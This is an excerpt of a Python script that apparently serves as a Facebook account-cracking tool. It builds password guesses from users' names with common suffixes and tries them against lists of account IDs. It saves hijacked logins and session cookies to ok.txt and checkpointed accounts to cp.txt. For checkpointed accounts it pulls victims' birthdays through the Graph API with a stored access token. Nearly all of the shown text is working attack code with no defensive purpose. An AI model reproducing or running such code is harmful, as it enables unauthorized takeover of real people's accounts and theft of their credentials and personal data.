...
def linex():
	print (" ")
def logo():
    print("\033[2;95m d8888b. d888888b  .o88b. d8888b.    \033[1;97m[\033[1;94m+\033[1;97m] XX \033[1;93m: \033[1;97m BICP")
...
def password(text):
    ...
    for i in text.split(" "):
        i=i.lower()
        if len(i)>=6 : results.append(i);results.append(i+"123");results.append(i+"12345");results.append(i+"1122");results.append(i+"@#");results.append(i+"@@");results.append(i+"##")
        elif len(i)==3 or len(i)==4 or len(i)==5 : results.append(i+"123");results.append(i+"12345");results.append(i+"1122");results.append(i+"@#");results.append(i+"@@");results.append(i+"##")
        else:continue
...
class crack:
    def __init__(self,isifile):
        ...
        while True:
            f = input('\033[1;97m[\033[1;94m+\033[1;97m] Chouse [ d ] : ')
            if f in [''] : continue
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read());tt = json.loads(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];print("\r\033[1;91m[CP] %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y));self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y));open("cp.txt","a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y));break
                    except(KeyError, IOError):m = " ";d = " ";y = " "
                    except:pass
                    print("\r\033[1;91m[CP] %s • %s               "%(fl.get("id"),i));self.cp.append("%s•%s"%(fl.get("id"),i));open("cp.txt","a+").write("%s•%s\n"%(fl.get("id"),i));break
                elif log.get("status")=="success":print("\r\033[1;92m[OK] %s • %s • %s              "%(fl.get("id"),i,koki(log.get("cookies"))));self.ada.append("%s•%s"%(fl.get("id"),i));open("ok.txt","a+").write("%s•%s\n"%(fl.get("id"),i));break
                else:continue
            self.ko+=1
